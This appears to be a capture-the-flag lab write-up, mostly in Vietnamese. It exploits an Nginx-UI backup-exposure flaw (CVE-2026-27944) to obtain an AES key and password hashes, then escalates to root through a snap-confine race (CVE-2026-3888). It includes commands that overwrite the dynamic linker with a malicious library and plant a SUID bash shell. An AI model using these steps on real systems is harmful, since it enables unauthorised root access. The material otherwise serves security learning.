### Enumerate

2 cổng mở: Web (80) và SSH (22).

![](Attachments/Pasted%20image%2020260502180555.png)

### Exploit Web Service - Initial Access

Dùng ffuf, phát hiện được subdomain dẫn tới trang đăng nhập quản trị:

![](Attachments/Pasted%20image%2020260502181031.png)

Trang quản trị Nginx-UI, dính CVE-2026-27944: A publicly exposed `/api/backup` endpoint allows anyone to download full application backups along with the encryption key and IV needed to decrypt them. Result: instant access to sensitive configs, credentials, and TLS material.

![](Attachments/Pasted%20image%2020260505195844.png)


`yV+cDV8aqZy8OyUo/mjCji3DsSwnGm0F/+6rFyaMmUo=:5eNDv6wSYAc8a7KJgiSAcA==`
The encryption keys are Base64-encoded AES-256 key (32 bytes) and IV (16 bytes), formatted as key:iv.

https://github.com/advisories/GHSA-g9w5-qffc-6762

Sau khai thác, phát hiện được mật khẩu băm của jonathan và admin (Nginx-UI)

![](Attachments/Pasted%20image%2020260502191915.png)

`jonathan$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq`
`admin$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvmg`

![](Attachments/Pasted%20image%2020260502192719.png)

![](Attachments/Pasted%20image%2020260502192739.png)

![](Attachments/Pasted%20image%2020260502192809.png)

Thử đăng nhập ssh:

![](Attachments/Pasted%20image%2020260502194616.png)

### Privelege Escalation

Để lên được root, ta phải khai thác CVE-2026-3888:

![](Attachments/Pasted%20image%2020260503173913.png)

https://cdn2.qualys.com/advisory/2026/03/17/snap-confine-systemd-tmpfiles.txt
https://github.com/nomaisthere/CVE-2026-3888

Phase 1: Biên dịch mã nguồn và thư viện có trong github

![](Attachments/Pasted%20image%2020260505200343.png)

Phase 2: Tạo sandbox 1

Mục đích là để giữ thư mục `/tmp` trong sandbox, vì cứ 4 phút, `systemd-tmpfiles` lại xoá những file không có thay đổi. Điều này làm xoá luôn thư mục `.snap`

![](Attachments/Pasted%20image%2020260505200419.png)

Phase 3: Chạy race helper

Khi tạo sandbox lần đầu, đồng thời sẽ làm qua luôn quá tình tạo "mimic". Ta phải set up lại môi trường như ban đầu, tức tại hiện lại quá trình tạo "mimic". Bằng cách phá huỷ: `--base snapd` là không hợp lệ.

Mở terminal 2, trong khi treo terminal 1:

![](Attachments/Pasted%20image%2020260505200558.png)

Chạy run helper:

Run from inside the sandbox's /tmp (we are still in /proc/5727/cwd)
```shell
~/firefox_2404 ~/librootshell.so
```

![](Attachments/Pasted%20image%2020260505200707.png)

Lúc này, chương tình xác nhận điểm trigger TOCTOU. Ta sẽ tiến hành ghi đè thư viện độc hại.

Phase 4: Trigger Root Shell

Treo Terminal 2, mở Terminal thứ 3, nhờ việc ghi ra file mà ta có được PID của cái sandbox đã tạo phía trên (sandbox 2).
Xác nhận chúng ta là chủ sở hữu của thư viện:

![](Attachments/Pasted%20image%2020260505200920.png)

Ta tiến hành tráo đổi thư viện này với thư viện độc hại đã chuẩn bị:
Plant busybox as /tmp/sh-static binary, no dependency on ld-linux
`cp /usr/bin/busybox ./tmp/sh`
Overwrite ld-linux with our shellcode
Ghi đè thư viện: Any dynamically-linked SUID binary executed in this namespace will now run our shellcode instead of the real dynamic linker.
```shell
cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
```

Trigger lệnh snap-confine trong sandbox (sandbox 3), 
![](Attachments/Pasted%20image%2020260505201020.png)

Phase 5:

Inside the busybox root shell:
```shell
cp /bin/bash /var/snap/firefox/common/bash
chmod 04755 /var/snap/firefox/common/bash
exit
```

Terminal 3 (outside the sandbox):

```shell
/var/snap/firefox/common/bash -p
```

![](Attachments/Pasted%20image%2020260505201225.png)






